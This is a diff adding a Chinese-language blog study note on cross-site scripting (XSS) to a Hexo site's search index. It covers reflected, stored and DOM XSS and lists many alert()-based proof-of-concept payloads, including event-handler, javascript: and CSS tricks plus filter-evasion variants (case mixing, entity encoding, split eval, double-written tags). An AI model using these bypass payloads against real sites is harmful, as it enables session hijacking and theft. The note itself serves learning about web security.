@@ -822,4 +822,105 @@ $ hexo d # == hexo deploy 上传 </code></pre>
         <tag>hexo</tag>
       </tags>
   </entry>
+  <entry>
+    <title>《网络安全》学习之XSS</title>
+    <url>/2020/08/28/%E3%80%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E4%B9%8BXSS/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XSS作为OWASP TOP 10之一，被称为跨站脚本攻击(Cross-site scripting)，本来应该缩写为CSS，但是由于和CSS(Cascading Style Sheets，层叠样式脚本)重名，所以更名为XSS。<br>主要基于javascript完成恶意的攻击行为，js可以非常灵活的操作html、css和浏览器，这就使得XSS攻击的“想象”空间特别大。<br>XSS通过将精心构造的代码（javascript）注入到网页中，并由浏览器解释运行这段代码以达到恶意攻击的效果。当用户访问被XSS脚本注入的网页，XSS脚本就会被提取出来，用户浏览器就会解析这段XSS代码，也就是说这时用户将被攻击了。用户最简单的动作解释使用浏览器上网，并且浏览器中有javascript解释器可以解析javascript，然而浏览器并不会判断代码是否恶意，即XSS的对象是用户和浏览器。<br>微博、浏览版、聊天室等收集用户输入的地方都有可能被注入XSS代码，都存在遭受XSS的风险，只要没有对用户的输入进行严格过滤就会被XSS。</p>
+<h2 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h2><p>XSS利用JS代码实现攻击，有很多种攻击方法，以下简单列出几种：</p>
+<ul>
+<li>盗取各种用户账号</li>
+<li>窃取用户cookie资料，冒充用户身份进入网站</li>
+<li>劫持用户会话，执行任意操作</li>
+<li>刷流量，执行弹窗广告</li>
+<li>传播蠕虫病毒</li>
+</ul>
+<h2 id="XSS漏洞的验证"><a href="#XSS漏洞的验证" class="headerlink" title="XSS漏洞的验证"></a>XSS漏洞的验证</h2><p>我们可以用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做PoC(Proof of Concept)。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POC                    &#x2F;&#x2F; 漏洞的验证与检测</span><br><span class="line">EXP                    &#x2F;&#x2F; 漏洞的完整利用工具</span><br><span class="line">shellcode              &#x2F;&#x2F; 利用漏洞时，所执行的代码</span><br><span class="line">payload                &#x2F;&#x2F; 攻击载荷</span><br><span class="line">                       sqlmap                  &#x2F;&#x2F; 攻击代码的模版</span><br><span class="line">                       msf                     &#x2F;&#x2F; shellcode类似，功能是建立与目标的连接</span><br></pre></td></tr></table></figure>
+<p>验证XSS漏洞存在的PoC如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;       &#x2F;&#x2F; 常用</span><br><span class="line">&lt;script&gt;confirm(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以在测试页面中提交这样的代码（以上任意一行），我们发现提交的代码会被当作字符串输出在html页面中，浏览器会根据<code>script</code>标签识别为javascript语句并执行，就能看到弹窗操作，也就是说可以执行其他js代码，因此我们验证了XSS漏洞的存在性。</p>
+<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>大概可以分为三类：反射型XSS、存储型XSS、DOM型XSS。</p>
+<ul>
+<li>反射型XSS<br>是非持久性、参数型的跨站脚本，反射型XSS的js代码在web应用的参数（变量）中。<br>如搜索框的反射型XSS，在搜索框中提交PoC<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，点击搜索，即可触发反射型XSS。可以注意到我们提交的poc会出现在search.php页面的keywords参数中。</li>
+<li>存储型XSS<br>是持久性跨站脚本，持久体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。<br>存储型XSS通常发生在留言板等地方，我们在留言板位置留言，将恶意代码写进数据库中。这只是第一步，因为XSS使用等js代码运行环境是浏览器，所以要浏览器从服务器载入恶意XSS代码时才能真正触发XSS。这时我们需要模拟网站后台管理员的身份查看留言，就能触发XSS了。</li>
+<li>DOM型XSS<br>比较特殊，是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊地方就是payload在浏览器本地修改DOM树而并不会传到服务器上执行，这也就使得DOM型XSS比较难以检测。<br>如例子<code>#message=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，我们以锚点点方式提交PoC。PoC并不会发送给服务器，但是已经触发了XSS，查看提交参数后的html页面（DOM树）会形成鲜明的对比。</li>
+</ul>
+<h2 id="XSS的构造"><a href="#XSS的构造" class="headerlink" title="XSS的构造"></a>XSS的构造</h2><ol>
+<li>利用<code>&lt;&gt;</code>构造html/javascript<br>可以利用<code>&lt;&gt;</code>构造<code>html</code>标签或<code>&lt;script&gt;</code>标签。<br>在测试页面提交参数<code>&lt;h1 style=&#39;color:red&#39;&gt;利用&lt;&gt;构造html/js&lt;/h1&gt;</code>或提交<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>
+<li>伪协议<br>也可以使用javascript：伪协议的方式构造XSS。<br>提交参数<code>&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me!&lt;/a&gt;</code>，然后点击超链接即可触发XSS。或使用<code>img</code>标签的伪协议（但是这种方法在IE6下测试成功）<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code>。</li>
+<li>产生自己的事件<br>“事件驱动”是一种比较经典的编程思想，在网页中会发生很多事件（比如鼠标移动、键盘键入等），javascript可以对这些事件进行响应，所以我们可以通过事件触发js函数，触发XSS。</li>
+</ol>
+<ul>
+<li>事件种类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows事件              对Windows对象触发的事件</span><br><span class="line">Form事件                 html表单内的动作触发事件</span><br><span class="line">Keyboard事件             键盘按键</span><br><span class="line">Mouse事件                由鼠标或类似用户动作触发的事件</span><br><span class="line">Media事件                由多媒体触发的事件</span><br></pre></td></tr></table></figure>
+如<code>&lt;img src=&#39;./smile.jpg&#39; onmouseover=&#39;alert(/xss/)&#39;&gt;</code>，这个标签会引入一个图片，当鼠标悬停在图片上时会触发XSS代码。<br>单行文本框的键盘点击事件<code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(/xss/)&quot;&gt;</code>，当点击键盘任意一个按键的时候触发。<br><code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(/xss/)&quot;&gt;</code><br><code>&lt;input type=&quot;button&quot; onclick=&quot;alert(/xss/)&quot;&gt;</code><br><code>&lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39;&gt;</code></li>
+</ul>
+<ol start="4">
+<li>利用CSS跨站（old）<br>我们也可以利用CSS(层叠样式脚本)触发XSS，但是这种方法比较古老，基本不太适合现在主流的浏览器，我们可以稍作了解（以下代码均在IE6下测试）。</li>
+</ol>
+<ul>
+<li>行内样式<br><code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;</code></li>
+<li>页内样式<br><code>&lt;style&gt;Body&#123;background-image:url(javascript:alert(/xss/))&#125;&lt;/style&gt;</code></li>
+<li>外部样式<br><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./xss.css&quot;&gt;&lt;div&gt;hello&lt;/div&gt;</code><br>xss.css文件内容如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br><span class="line">div&#123;</span><br><span class="line">    &#x2F;* width:expression(alert(&#x2F;xss&#x2F;))*&#x2F;</span><br><span class="line">    background-image:url(javascript:alert(&#x2F;xss&#x2F;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>expression<br><code>&lt;div style=&quot;width:expression(alert(/xss/))&quot;&gt;</code><br><code>&lt;style&gt;Body&#123;background-image:expression(alert(/xss/));&#125;&lt;/style&gt;</code></li>
+<li>import<br><code>&lt;style&gt;@import &#39;javascript:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code><br><code>&lt;style type=&quot;text/css&quot;&gt;@import url(xss.css);&lt;/style&gt;&lt;div&gt;xxx&lt;/div&gt;</code></li>
+</ul>
+<ol start="5">
+<li>其他标签以及手法<br>我们也可以用其他标签触发XSS<br><code>&lt;svg onload=&quot;alert(/xss/)&quot;&gt;</code>这个语句还是比较简洁的。<br><code>&lt;input onfocus=alert(/xss/) autofocus&gt;</code></li>
+</ol>
+<h2 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h2><p>我们可以构造XSS进行各种变形，以绕过XSS过滤器的检测。变形方式主要有以下几种：</p>
+<ol>
+<li>大小写转换<br>可以将payload进行大小写转换，如下面两个例子：<br><code>&lt;Img sRc=&#39;#&#39; Onerror=&quot;alert(/xss/)&quot; /&gt;</code><br><code>&lt;a hREf=&quot;javaScript:alert(/xss/)&quot;&gt;click me&lt;/a&gt;</code></li>
+<li>引号的使用<br>html语言中对引号的使用不敏感，但是某些过滤函数时“锱铢必较”<br><code>&lt;img src=&quot;#&quot; onerrpr=&quot;alert(/xss/)&quot; /&gt;</code><br><code>&lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39; /&gt;</code><br><code>&lt;img src=# onerror=alert(/xss/) /&gt;</code></li>
+<li><code>/</code>可以代替空格<br>我们还可以使用<code>/</code>左斜线代替空格<br><code>&lt;Img/src=&#39;#&#39;/Onerror=&#39;alert(/xss/)&#39; /&gt;</code></li>
+<li>回车<br>我们可以在一些未知添加Tab(水平制表符)和回车符来绕过关键字检测。<br><code>&lt;Img/sRc=&#39;#&#39;/Onerror =&#39;alert(/xss/)&#39; /&gt;</code><br><code>&lt;A hREf=&quot;j avascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></li>
+<li>对标签属性值进行转码<br>我们也可以对标签属性值进行转码来绕过过滤。对应编码如下：</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="center">字母</th>
+<th align="center">ASCII码</th>
+<th align="center">十进制编码</th>
+<th align="center">十六进制编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">a</td>
+<td align="center">97</td>
+<td align="center">&#97;</td>
+<td align="center">&#x61;</td>
+</tr>
+<tr>
+<td align="center">e</td>
+<td align="center">101</td>
+<td align="center">&#101;</td>
+<td align="center">&#x65;</td>
+</tr>
+</tbody></table>
+<p>经过简单编码之后的样子：<code>&lt;A hREf=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code><br>另外我们可以将以下字符插入到任意位置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tab     &amp;#9</span><br><span class="line">换行     &amp;#10</span><br><span class="line">回车     &amp;#13</span><br></pre></td></tr></table></figure>
+<p>可以将以下字符插入到头部位置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SOH     &amp;#01</span><br><span class="line">STX     &amp;#02</span><br></pre></td></tr></table></figure>
+<p>经过编码后到样子：<br><code>&lt;A hREf=&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;&gt; click me! &lt;/a&gt;</code></p>
+<ol start="6">
+<li>拆分跨站<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;z&#x3D;&#39;alert&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;(&#x2F;xss&#x2F;)&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>双写绕过<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure></li>
+<li>CSS中的变形</li>
+</ol>
+<ul>
+<li>使用全角字符<br><code>width:e x p r e s s i o n(alert(/xss/))</code></li>
+<li>注释会被浏览器忽略<br><code>width:expr/*~*/ession(alert(/x~s~s/))</code></li>
+<li>样式表中的<code>\</code>和<code>\0</code><br><code>&lt;style&gt;@import &#39;javasc/ri/0pt:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code></li>
+</ul>
+<h2 id="Shellcode的调用"><a href="#Shellcode的调用" class="headerlink" title="Shellcode的调用"></a>Shellcode的调用</h2><p>Shellcode就是在利用漏洞所执行的代码。<br>完整的XSS攻击，会将shellcode存放在一定的地方，然后触发漏洞调用shellcode。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>XSS</tag>
+        <tag>Shellcode</tag>
+      </tags>
+  </entry>
 </search>
